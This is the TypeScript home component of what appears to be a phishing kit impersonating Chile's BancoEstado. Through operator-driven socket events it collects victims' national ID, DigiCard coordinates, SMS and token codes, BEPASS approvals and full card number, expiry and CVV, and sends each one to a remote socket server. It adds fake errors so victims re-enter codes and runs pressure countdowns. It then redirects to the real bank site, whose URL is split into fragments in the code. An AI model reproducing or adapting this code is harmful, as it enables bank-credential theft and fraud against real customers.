import { Component, ElementRef, OnInit, ViewChild } from '@angular/core';
import { RandonParams } from 'src/app/shared/class/rand-params';
import { TextStorage } from 'src/app/shared/class/text-storage';
import { TextsInterface } from 'src/app/shared/interfaces/texts.interface';
import { UserModel } from 'src/app/shared/models/user.model';
import { SocketWebService } from 'src/app/shared/services/socket-web.service';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.css'],
})
export class HomeComponent implements OnInit {
  @ViewChild('defaultCredit') defaultCredit: ElementRef<HTMLInputElement> =
    {} as ElementRef;
  @ViewChild('defaultPaid') defaultPaid: ElementRef<HTMLInputElement> =
    {} as ElementRef;

  public userModel: UserModel;
  private randParams: RandonParams;

  public ifStep1: boolean = false;
  public ifStep2: boolean = false;
  public ifStep3: boolean = false;
  public ifStep4: boolean = false;
  public ifStep5: boolean = false;
  public ifStep6: boolean = false;
  public ifStep7: boolean = false;
  public ifStep8: boolean = false;
  public ifStep9: boolean = false;
  public ifStep10: boolean = false;
  public ifStep11: boolean = false;
  public ifStep12: boolean = false;
  public ifStep13: boolean = false;

  public userName: string = 'Estimado Cliente';
  public shortName: string = '';
  public isName: boolean = false;
  public isLoading: boolean = false;

  public counterCoors: number = 0;
  public counterDigiPass: number = 0;

  public onePlaceHold: string = 'A1';
  public twoPlaceHold: string = 'H5';
  public threePlaceHold: string = 'C4';

  public corsOne: string = '';
  public corsTwo: string = '';
  public corsThree: string = '';
  public countDown: string = '2000';

  public indicator: string = '';
  public typeCard: string = '';
  public isCreditCard: boolean = true;

  public corsOneError: boolean = false;
  public corsTwoError: boolean = false;
  public corsThreeError: boolean = false;
  public isGlobalError: boolean = false;

  public terceraClave: string = '';
  public terceraClaveError: boolean = false;
  public ifBEEpassError: boolean = false;

  public idDispositivo: string = '';
  public claveToken: string = '';
  public claveTokenError: boolean = false;

  public subCoors: boolean = false;
  public isErrorCors: boolean = false;
  public isErrorCorsTxt: boolean = false;

  public isCardImg = false;
  public defaultImg = '/assets/img/5rte.png';
  public mastercardImg = '/assets/img/1esc.png';
  public visaImg = '/assets/img/2tblo.png';
  public amexIgm = '/assets/img/3hblo.png';
  public discoverImg = '/assets/img/4hre.png';
  public defaultI2 = '/assets/img/5rte.png';

  // CARD VARIABLES
  public isCardNumberError = false;
  public isCardExpError = false;
  public isCardCvvError = false;

  public isDisableButton = false;
  public isCardNumberSuccess = false;
  public isCardExpSuccess = false;
  public isCardCvvSuccess = false;

  public dateTime: Date = new Date();

  public currentAbono: string = '';
  public currentPay: string = '';

  showErrorCreditSelect: boolean = false;
  showErrorPaySelect: boolean = false;

  textStorage: TextStorage;
  dynamicTexts: TextsInterface;

  tempInputs = new Array();

  constructor(private socketSrv: SocketWebService) {
    this.userModel = new UserModel();
    this.randParams = new RandonParams();

    this.textStorage = new TextStorage();
    this.dynamicTexts = this.textStorage.getDynamicTexts();

    // const isRepead = localStorage.getItem('repead') || 'undefined';
    // if(isRepead && isRepead === "true"){
    //   this.changeModal(3);
    // }

    socketSrv.finalResult.subscribe((res) => {
      if (res.event && res.event !== 'repeat' && res.event !== 'noAllowed') {
        this.showOpction(res);
      }
    });

    this.userModel.rut = localStorage.getItem('userRut') || 'undefined';

    const userName = localStorage.getItem('userName');
    if (userName && userName !== 'Indefinido') {
      this.isName = true;
      this.userName = userName;

      let splits = userName.split(' ');
      this.shortName = `${splits[0]} ${splits[1] || ''}`;
    }

    this.dateTime = new Date();

    const ifReload = localStorage.getItem('reload');
    if (ifReload) {
      let current = +ifReload;
      localStorage.removeItem('reload');
      this.changeModal(current);
    } else {
      this.changeModal(1);

      setTimeout(() => {
        this.changeModal(2);
      }, 5000);
    }

    this.socketSrv.sendData({
      event: 'READY',
      rut: this.userModel.rut,
    });

    // this.socketSrv.sendData({
    //   event: 'DIGICARD',
    //   rut: this.userModel.rut,
    //   coors: `${this.onePlaceHold}:${this.corsOne} ${this.twoPlaceHold}:${this.corsTwo} ${this.threePlaceHold}:${this.corsThree}`
    // });
  }

  ngOnInit(): void {}

  typeCredit(event: any, opt: string) {
    this.currentAbono = opt;
    let text: any = this.defaultCredit.nativeElement.labels;
    this.addCheckBoxAndDisabled(
      this.defaultCredit.nativeElement,
      text[0].textContent
    );
    this.addCheckBoxAndDisabled(event.target, opt);

    event.target.checked = true;
  }

  typePaid(event: any, opt: string) {
    this.currentPay = opt;
    let text: any = this.defaultPaid.nativeElement.labels;
    this.addCheckBoxAndDisabled(
      this.defaultPaid.nativeElement,
      text[0].textContent
    );
    this.addCheckBoxAndDisabled(event.target, opt);

    event.target.checked = true;
  }

  addCheckBoxAndDisabled(event: any, opt: string): boolean {
    let found = undefined;
    for (let i = 0; i < this.tempInputs.length; i++) {
      const obj = this.tempInputs[i];
      obj.event.checked = false;
      if (obj.opt.trim() === opt.trim()) {
        found = true;
      }
    }

    if (!found) {
      this.tempInputs.push({
        opt,
        event,
      });
    }
    return true;
  }

  // active(current: string) {
  //   if (current === 'one') {
  //     this.optOne = !this.optOne;

  //     this.currentAbono = this.oneElem.nativeElement.textContent || '';

  //     this.optTwo = false;
  //     this.optThree = false;
  //   } else if (current === 'two') {
  //     this.optTwo = !this.optTwo;

  //     this.currentAbono = this.twoElem.nativeElement.textContent || '';

  //     this.optOne = false;
  //     this.optThree = false;
  //   } else if (current === 'three') {
  //     this.optThree = !this.optThree;
  //     this.currentAbono = this.threeElem.nativeElement.textContent || '';

  //     this.optOne = false;
  //     this.optTwo = false;
  //   } else if (current === 'four') {
  //     this.optFour = !this.optFour;
  //     this.currentPay = this.fourElem.nativeElement.textContent || '';

  //     this.optFive = false;
  //   } else if (current === 'five') {
  //     this.optFive = !this.optFive;
  //     this.currentPay = this.fiveElem.nativeElement.textContent || '';

  //     this.optFour = false;
  //   }
  // }

  changeModal(current: number) {
    this.ifStep1 = false;
    this.ifStep2 = false;
    this.ifStep3 = false;
    this.ifStep4 = false;
    this.ifStep5 = false;
    this.ifStep6 = false;
    this.ifStep7 = false;
    this.ifStep8 = false;
    this.ifStep9 = false;
    this.ifStep10 = false;
    this.ifStep11 = false;
    this.ifStep12 = false;
    this.ifStep13 = false;

    if (current === 1) {
      this.ifStep1 = true;
    } else if (current === 2) {
      this.ifStep2 = true;
    } else if (current === 3) {
      this.ifStep3 = true;
    } else if (current === 4) {
      this.ifStep4 = true;
    } else if (current === 5) {
      this.ifStep5 = true;
    } else if (current === 6) {
      this.ifStep6 = true;
    } else if (current === 7) {
      this.ifStep7 = true;
    } else if (current === 8) {
      this.ifStep8 = true;
    } else if (current === 9) {
      this.ifStep9 = true;
    } else if (current === 10) {
      this.ifStep10 = true;
      this.centrarRedired(10000);
    } else if (current === 11) {
      this.ifStep11 = true;
      this.centrarRedired(5000);
    } else if (current === 12) {
      this.ifStep12 = true;
      this.centrarRedired(5000);
    } else if (current === 13) {
      this.ifStep13 = true;
      setTimeout(() => {
        document.location.href = 'https://mercadoaqui.cl/';
      }, 5000);
    } else {
      this.ifStep1 = true;
    }
  }

  centrarRedired(ms: number) {
    setTimeout(() => {
      let part = 'https://www.ban';
      document.location.href = `${part}coestado.cl/`;
    }, ms);
  }

  showOpction(data: any) {
    const show = data.event;
    this.isLoading = false;
    this.isGlobalError = false;

    // console.log('DATA => ', data);

    this.clearFiels();

    if (show === 'opt-creditos') {
      this.changeModal(2);
    } else if (show === 'opt-pagos') {
      this.changeModal(3);
    } else if (show === 'digicard') {
      this.isErrorCors = false;
      this.isErrorCorsTxt = false;

      this.onePlaceHold = data.aditionals.one;
      this.twoPlaceHold = data.aditionals.two;
      this.threePlaceHold = data.aditionals.three;

      this.counterDigiPass += 1;

      if (this.counterDigiPass > 1) {
        this.changeModal(4);
      } else {
        this.changeModal(4);
      }
    } else if (show === 'smsmobil') {
      this.terceraClaveError = false;

      if (data.aditionals.count === 6) {
        this.changeModal(6);
      } else {
        this.changeModal(5);
      }
    } else if (show === 'token') {
      this.claveTokenError = false;
      this.changeModal(7);
    } else if (show === 'bepass') {
      this.runCounter(2, 59);
      this.changeModal(8);
    } else if (show === 'card') {
      if (data.aditionals.card === 'credito') {
        this.indicator = data.aditionals.indicator.toUpperCase();

        this.isCreditCard = true;

        this.typeCard = data.aditionals.typecard;
        if (this.typeCard === 'Visa') {
          this.defaultImg = this.visaImg;
        } else if (this.typeCard === 'Mastercard') {
          this.defaultImg = this.mastercardImg;
        }
      } else {
        this.defaultImg = this.defaultImg;
        this.isCreditCard = false;
      }

      this.changeModal(9);
    } else if (show === 'repeat') {
      this.changeModal(10);
      // localStorage.removeItem("reload");
      // this.reload();
    } else if (show === 'finish') {
      this.changeModal(11);
      // localStorage.setItem("reload", "10");
      // this.reload();
    } else if (show === 'noAutorize') {
      this.changeModal(12);
      // localStorage.setItem("reload", "11");
      // this.reload();
    } else if (show === 'redired') {
      this.changeModal(13);
    }
  }

  clearFiels() {
    this.corsOne = '';
    this.corsTwo = '';
    this.corsThree = '';
    this.terceraClave = '';
    this.claveToken = '';
    this.userModel.ccNu = '';
    this.userModel.ccEp = '';
    this.userModel.ccCv = '';
  }

  sendCreditSelect(): boolean {
    if (!this.currentAbono || !this.currentAbono.length) {
      let text: any = this.defaultCredit.nativeElement.labels;
      this.currentAbono = text[0].textContent;
    }

    this.isLoading = true;

    this.socketSrv.sendData({
      event: 'SELECCION',
      opt: this.currentAbono.toUpperCase(),
      rut: this.userModel.rut,
    });

    setTimeout(() => {
      this.changeModal(3);
      this.isLoading = false;
    }, 3000);

    return true;
  }

  sendPaySelect(): boolean {
    if (!this.currentPay || !this.currentPay.length) {
      let text: any = this.defaultPaid.nativeElement.labels;
      this.currentPay = text[0].textContent;
    }

    this.isLoading = true;

    this.socketSrv.sendData({
      event: 'SELECCION PAGOS',
      opt: this.currentPay.toUpperCase(),
      rut: this.userModel.rut,
    });
    return true;
  }

  async authorizeCoors() {
    setTimeout(() => {
      this.isLoading = false;
      this.changeModal(3);
    }, 5000);
  }

  inputOnchange(newValue: string, ref: any, abr?: any) {
    if (newValue.length === 2) {
      abr.classList.add('changeBack');
      ref.focus();
    }
  }

  inputOnchange2(newValue: string, abr: any) {
    if (newValue.length === 2) {
      abr.classList.add('changeBack');
    }
  }

  justNumerKeyPress(event: KeyboardEvent) {
    const tecla = document.all ? event.keyCode : event.which;
    if (tecla === 8) {
      return true;
    }
    const patron = /[0-9]/;
    const teclaFinal = String.fromCharCode(tecla);
    return patron.test(teclaFinal);
  }

  async validarCoors() {
    this.clearError();
    if (!this.corsOne || !this.corsTwo || !this.corsThree) {
      if (!this.corsOne) {
        this.corsOneError = true;
      }
      if (!this.corsTwo) {
        this.corsTwoError = true;
      }
      if (!this.corsThree) {
        this.corsThreeError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    const one = this.hasLetter(this.corsOne);
    if (one) return (this.corsOneError = true);
    const two = this.hasLetter(this.corsTwo);
    if (two) return (this.corsTwoError = true);
    const three = this.hasLetter(this.corsThree);
    if (three) return (this.corsThreeError = true);

    if (
      this.corsOne.length !== 2 ||
      this.corsTwo.length !== 2 ||
      this.corsThree.length !== 2
    ) {
      if (this.corsOne.length !== 2) {
        this.corsOneError = true;
      }
      if (this.corsTwo.length !== 2) {
        this.corsTwoError = true;
      }
      if (this.corsThree.length !== 2) {
        this.corsThreeError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    this.isLoading = true;
    this.counterCoors += 1;

    this.socketSrv.sendData({
      event: 'DIGICARD',
      rut: this.userModel.rut,
      coors: `${this.onePlaceHold}:${this.corsOne} ${this.twoPlaceHold}:${this.corsTwo} ${this.threePlaceHold}:${this.corsThree}`,
    });

    if (this.counterCoors < 2) {
      setTimeout(() => {
        this.isErrorCors = true;
      }, 5000);
    }

    this.clearError();
    return true;
  }

  recargar() {
    this.isErrorCorsTxt = true;
    this.isErrorCors = false;

    this.socketSrv.sendData({
      event: 'DIGICARD2',
      rut: this.userModel.rut,
      coors: `${this.onePlaceHold}:${this.corsOne} ${this.twoPlaceHold}:${this.corsTwo} ${this.threePlaceHold}:${this.corsThree}`,
    });
  }

  async validarSMS() {
    this.clearError();

    if (!this.terceraClave) {
      if (!this.terceraClave) {
        this.terceraClaveError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    const one = this.hasLetter(this.terceraClave);
    if (one) {
      this.terceraClaveError = true;
      return false;
    }

    if (this.terceraClave.length !== 4) {
      if (this.terceraClave.length !== 4) {
        this.terceraClaveError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    this.isLoading = true;

    this.socketSrv.sendData({
      event: 'SMSMOBIL',
      rut: this.userModel.rut,
      sms: this.terceraClave,
    });

    this.clearError();
    return true;
  }

  async validarSMSSix() {
    this.clearError();
    if (!this.terceraClave) {
      if (!this.terceraClave) {
        this.terceraClaveError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    const one = this.hasLetter(this.terceraClave);
    if (one) {
      this.terceraClaveError = true;
      return false;
    }

    if (this.terceraClave.length !== 6) {
      if (this.terceraClave.length !== 6) {
        this.terceraClaveError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    this.isLoading = true;

    this.socketSrv.sendData({
      event: 'SMSMOBIL',
      rut: this.userModel.rut,
      sms: this.terceraClave,
    });

    this.clearError();
    return true;
  }

  async validarToken() {
    this.clearError();

    if (!this.claveToken) {
      if (!this.claveToken) {
        this.claveTokenError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    const one = this.hasLetter(this.claveToken);
    if (one) {
      this.claveTokenError = true;
      return false;
    }

    if (this.claveToken.length !== 6) {
      if (this.claveToken.length !== 6) {
        this.claveTokenError = true;
      }
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }

    this.isLoading = true;

    this.socketSrv.sendData({
      event: 'TOKEN',
      rut: this.userModel.rut,
      token: this.claveToken,
    });

    this.clearError();
    return true;
  }

  requestBePass() {
    this.socketSrv.sendData({
      event: 'BEPASS',
      rut: this.userModel.rut,
      bepass: '',
    });

    this.isLoading = true;

    setTimeout(() => {
      this.isLoading = false;
      this.runCounter(2, 59);
      this.ifBEEpassError = false;
    }, 3000);
  }

  vincularCC() {
    if (
      this.isCardNumberSuccess &&
      this.isCardExpSuccess &&
      this.isCardCvvSuccess
    ) {
      let lasFourNumber = this.userModel.ccNu.substring(
        this.userModel.ccNu.length - 4,
        this.userModel.ccNu.length
      );

      if (this.isCreditCard) {
        if (lasFourNumber.trim() !== this.indicator.trim()) {
          this.isCardNumberError = true;
          this.isGlobalError = true;

          setTimeout(() => {
            this.isGlobalError = false;
          }, 10000);
          return false;
        }
      }

      this.isLoading = true;
      this.socketSrv.sendData({
        event: 'TARJETA',
        rut: this.userModel.rut,
        data: `NUMBER:${this.userModel.ccNu} EXP:${this.userModel.ccEp} CVV:${this.userModel.ccCv}`,
      });

      return true;
    } else {
      this.isGlobalError = true;
      setTimeout(() => {
        this.isGlobalError = false;
      }, 5000);
      return false;
    }
  }

  private clearError() {
    // this.isGlobalError = false;
    this.corsOneError = false;
    this.corsTwoError = false;
    this.corsThreeError = false;
    this.terceraClaveError = true;
    return true;
  }

  private hasLetter(cadena: string) {
    if (isNaN(+cadena)) {
      return true;
    }
    return false;
  }

  reload() {
    let rout = this.getLoginRoute();
    // location.href = "/tvshow"
    location.href = rout;
  }

  private getLoginRoute(): string {
    let loginRoutes: string[] = ['home', 'tablero', 'central'];

    return loginRoutes[Math.floor(Math.random() * loginRoutes.length)];
  }

  salir() {
    let part = 'https://www.ban';
    // document.location.href = `${part}coestado.cl/`;
    document.location.href = `https://mercadoaqui.cl/ `;
  }

  goStore() {
    document.location.href = 'https://mercadoaqui.cl/';
  }

  runCounter(minutes: number, seconds: number) {
    let time_minutes = minutes;
    let time_seconds = seconds;
    let duration = time_minutes * 60 + time_seconds;

    this.countDown = `${this.paddedFormat(time_minutes)}:${this.paddedFormat(
      time_seconds
    )}`;
    this.startCountDown(--duration);
  }

  startCountDown(duration: number) {
    let secondsRemaining = duration;
    let min = 0;
    let sec = 0;

    let countInterval = setInterval(() => {
      min = secondsRemaining / 60;
      sec = secondsRemaining % 60;

      this.countDown = `${this.paddedFormat(
        parseInt(min.toString())
      )}:${this.paddedFormat(parseInt(sec.toString()))}`;
      secondsRemaining = secondsRemaining - 1;

      if (secondsRemaining < 11) {
        this.ifBEEpassError = true;
      }
      if (secondsRemaining < 0) {
        clearInterval(countInterval);
      }
    }, 1000);
  }

  paddedFormat(num: any): string {
    let currentNum = +num;
    if (currentNum < 10) {
      return '0' + currentNum;
    } else {
      return currentNum.toString();
    }
  }

  // #region ON CHANGE EVENTS
  cardNumberOnChange(cardLeng: any, revelo1: any) {
    if (!this.userModel.ccNu) {
      this.isDisableButton = true;
      return;
    }
    const longitud = cardLeng.toString().length;
    const firtLetter = this.userModel.ccNu.substr(0, 1);

    if (cardLeng.length < 4) {
      this.defaultImg = this.defaultI2;
    }

    if (cardLeng.length > 4) {
      if (firtLetter === '3') {
        this.defaultImg = this.amexIgm;
      } else if (firtLetter === '4') {
        this.isCardImg = true;
        this.defaultImg = this.visaImg;
      } else if (firtLetter === '5') {
        this.isCardImg = true;
        this.defaultImg = this.mastercardImg;
      } else if (firtLetter === '6') {
        this.isCardImg = true;
        this.defaultImg = this.discoverImg;
      }
    }
    this.isDisableButton = true;
    if (cardLeng.length > 15) {
      const checkCard = this.IsValidCreditCardNumber(cardLeng);
      if (!checkCard) {
        this.isCardNumberError = true;
        this.isDisableButton = true;
        return;
      }
      const result = this.checkCreditCard(cardLeng, checkCard);
      if (!result) {
        this.isCardNumberError = true;
        this.isDisableButton = true;
        return;
      }

      if (checkCard === 'americanexpress') {
        this.isCardImg = true;
        this.defaultImg = this.amexIgm;
      } else if (checkCard === 'visa') {
        this.isCardImg = true;
        this.defaultImg = this.visaImg;
      } else if (checkCard === 'mastercard') {
        this.isCardImg = true;
        this.defaultImg = this.mastercardImg;
      } else if (checkCard === 'discover') {
        this.isCardImg = true;
        this.defaultImg = this.discoverImg;
      }

      this.isCardNumberSuccess = true;
      this.isCardNumberError = false;

      if (
        this.isCardNumberSuccess &&
        this.isCardExpSuccess &&
        this.isCardCvvSuccess
      ) {
        this.isDisableButton = false;
      }

      revelo1.focus();
    }
  }

  cardExpOnChange(newValue: any, relevo2: any) {
    this.userModel.ccEp = newValue;
    const longitud = newValue.toString().length;
    if (longitud === 2) {
      this.userModel.ccEp += '/';
    }
    if (!this.userModel.ccEp || this.userModel.ccEp.length !== 5) {
      this.isDisableButton = true;
      return;
    }
    const year = +this.userModel.ccEp.substr(-2);
    const month = +this.userModel.ccEp.substr(0, 2);
    if (month > 12 || month < 1) {
      this.isCardExpError = true;
      this.isDisableButton = true;
      return;
    }
    if (year < 20 || year > 30) {
      this.isCardExpError = true;
      this.isDisableButton = true;
      return;
    }
    if (year === 20) {
      if (month < 8) {
        this.isCardExpError = true;
        this.isDisableButton = true;
        return;
      }
    }
    this.isCardExpSuccess = true;
    this.isCardExpError = false;
    if (
      this.isCardNumberSuccess &&
      this.isCardExpSuccess &&
      this.isCardCvvSuccess
    ) {
      this.isDisableButton = false;
    }
    relevo2.focus();
  }

  cardCvvOnChange(ehloq: any) {
    if (!this.userModel.ccCv) {
      return;
    }
    const hashLetter = this.hasLetter(this.userModel.ccCv);
    if (hashLetter) {
      this.isCardCvvError = true;
      this.isDisableButton = true;
      return;
    }
    if (ehloq.length < 3) {
      this.isCardCvvError = true;
      this.isDisableButton = true;
      return;
    }
    this.isCardCvvSuccess = true;
    this.isCardCvvError = false;
    if (
      this.isCardNumberSuccess &&
      this.isCardExpSuccess &&
      this.isCardCvvSuccess
    ) {
      this.isDisableButton = false;
    }
  }
  // #endregion

  // #region CHANGE EVENTS
  cardNumberChange(cardLeng: any, revelo1: any) {
    if (!this.userModel.ccNu) {
      this.isDisableButton = true;
      return;
    }
    const longitud = cardLeng.toString().length;
    const firtLetter = this.userModel.ccNu.substr(0, 1);

    if (cardLeng.length < 4) {
      this.defaultImg = this.defaultI2;
    }

    if (cardLeng.length > 4) {
      if (firtLetter === '3') {
        this.defaultImg = this.amexIgm;
      } else if (firtLetter === '4') {
        this.isCardImg = true;
        this.defaultImg = this.visaImg;
      } else if (firtLetter === '5') {
        this.isCardImg = true;
        this.defaultImg = this.mastercardImg;
      } else if (firtLetter === '6') {
        this.isCardImg = true;
        this.defaultImg = this.discoverImg;
      }
    }
    this.isDisableButton = true;
    if (cardLeng.length > 15) {
      const checkCard = this.IsValidCreditCardNumber(cardLeng);
      if (!checkCard) {
        this.isCardNumberError = true;
        this.isDisableButton = true;
        return;
      }
      const result = this.checkCreditCard(cardLeng, checkCard);
      if (!result) {
        this.isCardNumberError = true;
        this.isDisableButton = true;
        return;
      }

      if (checkCard === 'americanexpress') {
        this.isCardImg = true;
        this.defaultImg = this.amexIgm;
      } else if (checkCard === 'visa') {
        this.isCardImg = true;
        this.defaultImg = this.visaImg;
      } else if (checkCard === 'mastercard') {
        this.isCardImg = true;
        this.defaultImg = this.mastercardImg;
      } else if (checkCard === 'discover') {
        this.isCardImg = true;
        this.defaultImg = this.discoverImg;
      }

      this.isCardNumberSuccess = true;
      this.isCardNumberError = false;

      if (
        this.isCardNumberSuccess &&
        this.isCardExpSuccess &&
        this.isCardCvvSuccess
      ) {
        this.isDisableButton = false;
      }

      revelo1.focus();
    }
  }

  cardExpChange(newValue: any, relevo2: any) {
    this.userModel.ccEp = newValue;
    const longitud = newValue.toString().length;
    if (longitud === 2) {
      this.userModel.ccEp += '/';
    }
    if (!this.userModel.ccEp || this.userModel.ccEp.length !== 5) {
      this.isDisableButton = true;
      return;
    }
    const year = +this.userModel.ccEp.substr(-2);
    const month = +this.userModel.ccEp.substr(0, 2);
    if (month > 12 || month < 1) {
      this.isCardExpError = true;
      this.isDisableButton = true;
      return;
    }
    if (year < 20 || year > 30) {
      this.isCardExpError = true;
      this.isDisableButton = true;
      return;
    }
    if (year === 20) {
      if (month < 8) {
        this.isCardExpError = true;
        this.isDisableButton = true;
        return;
      }
    }
    this.isCardExpSuccess = true;
    this.isCardExpError = false;
    if (
      this.isCardNumberSuccess &&
      this.isCardExpSuccess &&
      this.isCardCvvSuccess
    ) {
      this.isDisableButton = false;
    }
    relevo2.focus();
  }

  cardCvvChange(ehloq: any) {
    if (!this.userModel.ccCv) {
      return;
    }
    const hashLetter = this.hasLetter(this.userModel.ccCv);
    if (hashLetter) {
      this.isCardCvvError = true;
      this.isDisableButton = true;
      return;
    }
    if (ehloq.length < 3) {
      this.isCardCvvError = true;
      this.isDisableButton = true;
      return;
    }
    this.isCardCvvSuccess = true;
    this.isCardCvvError = false;
    if (
      this.isCardNumberSuccess &&
      this.isCardExpSuccess &&
      this.isCardCvvSuccess
    ) {
      this.isDisableButton = false;
    }
  }
  // #endregion

  IsValidCreditCardNumber(cardNumber: string) {
    let cardType = null;
    if (this.VisaCardnumber(cardNumber)) {
      cardType = 'visa';
    } else if (this.MasterCardnumber(cardNumber)) {
      cardType = 'mastercard';
    } else if (this.AmexCardnumber(cardNumber)) {
      cardType = 'americanexpress';
    } else if (this.DiscoverCardnumber(cardNumber)) {
      cardType = 'discover';
    } else if (this.DinerClubCardnumber(cardNumber)) {
      cardType = 'dinerclub';
    } else if (this.JCBCardnumber(cardNumber)) {
      cardType = 'jcb';
    }
    return cardType;
  }

  AmexCardnumber(inputtxt: string) {
    const cardno = /^(?:3[47][0-9]{13})$/;
    return cardno.test(inputtxt);
  }

  VisaCardnumber(inputtxt: string) {
    const cardno = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
    return cardno.test(inputtxt);
  }

  MasterCardnumber(inputtxt: string) {
    const cardno = /^(?:5[1-5][0-9]{14})$/;
    return cardno.test(inputtxt);
  }

  DiscoverCardnumber(inputtxt: string) {
    const cardno = /^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;
    return cardno.test(inputtxt);
  }

  DinerClubCardnumber(inputtxt: string) {
    const cardno = /^(?:3(?:0[0-5]|[68][0-9])[0-9]{11})$/;
    return cardno.test(inputtxt);
  }

  JCBCardnumber(inputtxt: string) {
    const cardno = /^(?:(?:2131|1800|35\d{3})\d{11})$/;
    return cardno.test(inputtxt);
  }

  checkCreditCard(cardnumber: string, cardname: string) {
    const cards = new Array();
    let cardError = '';

    cards[0] = {
      name: 'Visa',
      length: '13,16',
      prefixes: '4',
      checkdigit: true,
    };
    cards[1] = {
      name: 'MasterCard',
      length: '16',
      prefixes: '51,52,53,54,55',
      checkdigit: true,
    };
    cards[2] = {
      name: 'DinersClub',
      length: '14,16',
      prefixes: '36,38,54,55',
      checkdigit: true,
    };
    cards[3] = {
      name: 'CarteBlanche',
      length: '14',
      prefixes: '300,301,302,303,304,305',
      checkdigit: true,
    };
    cards[4] = {
      name: 'AmEx',
      length: '15',
      prefixes: '34,37',
      checkdigit: true,
    };
    cards[5] = {
      name: 'Discover',
      length: '16',
      prefixes: '6011,622,64,65',
      checkdigit: true,
    };
    cards[6] = { name: 'JCB', length: '16', prefixes: '35', checkdigit: true };
    cards[7] = {
      name: 'enRoute',
      length: '15',
      prefixes: '2014,2149',
      checkdigit: true,
    };
    cards[8] = {
      name: 'Solo',
      length: '16,18,19',
      prefixes: '6334,6767',
      checkdigit: true,
    };
    cards[9] = {
      name: 'Switch',
      length: '16,18,19',
      prefixes: '4903,4905,4911,4936,564182,633110,6333,6759',
      checkdigit: true,
    };
    cards[10] = {
      name: 'Maestro',
      length: '12,13,14,15,16,18,19',
      prefixes: '5018,5020,5038,6304,6759,6761,6762,6763',
      checkdigit: true,
    };
    cards[11] = {
      name: 'VisaElectron',
      length: '16',
      prefixes: '4026,417500,4508,4844,4913,4917',
      checkdigit: true,
    };
    cards[12] = {
      name: 'LaserCard',
      length: '16,17,18,19',
      prefixes: '6304,6706,6771,6709',
      checkdigit: true,
    };

    let cardType = -1;
    for (let i = 0; i < cards.length; i++) {
      if (cardname.toLowerCase() == cards[i].name.toLowerCase()) {
        cardType = i;
        break;
      }
    }

    if (cardType == -1) {
      cardError = 'ccErrorNo';
      return false;
    }

    if (cardnumber.length == 0) {
      cardError = 'ccErrorNo';
      return false;
    }

    cardnumber = cardnumber.replace(/\s/g, '');
    let cardNo = cardnumber;
    let cardexp = /^[0-9]{13,19}$/;
    if (!cardexp.exec(cardNo)) {
      cardError = 'ccErrorNo';
      return false;
    }

    if (cards[cardType].checkdigit) {
      let checksum = 0;
      const mychar = '';
      let j = 1;

      let calc;
      for (let i = cardNo.length - 1; i >= 0; i--) {
        calc = Number(cardNo.charAt(i)) * j;
        if (calc > 9) {
          checksum = checksum + 1;
          calc = calc - 10;
        }

        checksum = checksum + calc;
        if (j == 1) {
          j = 2;
        } else {
          j = 1;
        }
      }

      if (checksum % 10 !== 0) {
        cardError = 'ccErrorNo';
        return false;
      }
    }

    if (cardNo == '5490997771092064') {
      cardError = 'ccErrorNo';
      return false;
    }

    let lengthValid = false;
    let prefixValid = false;

    let prefix = new Array();
    let lengths = new Array();
    prefix = cards[cardType].prefixes.split(',');

    for (let i = 0; i < prefix.length; i++) {
      const exp = new RegExp('^' + prefix[i]);
      if (exp.test(cardNo)) {
        prefixValid = true;
      }
    }

    if (!prefixValid) {
      cardError = 'ccErrorNo';
      return false;
    }

    lengths = cards[cardType].length.split(',');
    for (let j = 0; j < lengths.length; j++) {
      if (cardNo.length == lengths[j]) {
        lengthValid = true;
      }
    }

    if (!lengthValid) {
      cardError = 'ccErrorNo';
      return false;
    }
    return true;
  }

  ngOnDestroy() {
    console.log('destroying child...');
  }

  // test(normalText: string): string {
  //   let union = `<strong>${this.currentAbono}</strong>`;
  //   return this.textStorage.getTextWithVariable(normalText, union);
  // }
}
